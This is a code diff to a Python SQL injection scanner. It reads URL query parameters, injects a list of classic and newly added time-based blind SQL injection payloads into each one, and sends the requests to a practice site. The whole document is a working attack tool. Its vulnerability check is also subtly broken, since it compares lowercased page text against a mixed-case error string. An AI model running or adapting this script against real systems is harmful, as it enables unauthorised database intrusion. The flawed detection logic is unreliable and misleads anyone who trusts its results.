@@ -1,17 +1,18 @@
 import requests
 from bs4 import BeautifulSoup
 import logging
+from urllib.parse import urlparse, parse_qs
 
 logging.basicConfig(level=logging.INFO)
 
 
 class SQLInjectionAttack:
-    def __init__(self, url, param_dict):
+    def __init__(self, url):
         self.url = url
-        self.param_dict = param_dict
+        self.params = self.get_params(url)
         self.payloads = [
             "' OR '1'='1",
-            ' OR 1=1; --',
+            " OR 1=1; --",
             '" OR 1=1; --',
             "' OR 'a'='a",
             '" OR "a"="a',
@@ -22,11 +23,17 @@ class SQLInjectionAttack:
             "' OR 1=1#",
             "' OR 1=1;%00",
             "' OR 1=1; --",
+            "1' WAITFOR DELAY '0:0:10' --",  # blind SQL Injection
+            "1\" WAITFOR DELAY '0:0:10' --",  # blind SQL Injection
         ]
 
+    @staticmethod
+    def get_params(url):
+        return parse_qs(urlparse(url).query)
+
     def inject_payload(self, payload):
-        for key in self.param_dict.keys():
-            injected_param_dict = self.param_dict.copy()
+        for key in self.params.keys():
+            injected_param_dict = self.params.copy()
             injected_param_dict[key] = payload
 
             response = requests.get(self.url, params=injected_param_dict)
@@ -40,8 +47,8 @@ class SQLInjectionAttack:
         return False
 
     def is_vulnerable(self, response_text):
-        bs = BeautifulSoup(response_text, 'html.parser')
-        if bs.body and 'error in your SQL syntax' in bs.body.text.lower():
+        bs = BeautifulSoup(response_text, "html.parser")
+        if bs.body and "error in your SQL syntax" in bs.body.text.lower():
             return True
         return False
 
@@ -55,8 +62,7 @@ class SQLInjectionAttack:
         return False
 
 
-if __name__ == '__main__':
-    url = "http://testphp.vulnweb.com"
-    param_dict = {"id": "1"}
-    sql_injection_attack = SQLInjectionAttack(url, param_dict)
+if __name__ == "__main__":
+    url = "http://testphp.vulnweb.com/?id=1"
+    sql_injection_attack = SQLInjectionAttack(url)
     sql_injection_attack.attack()
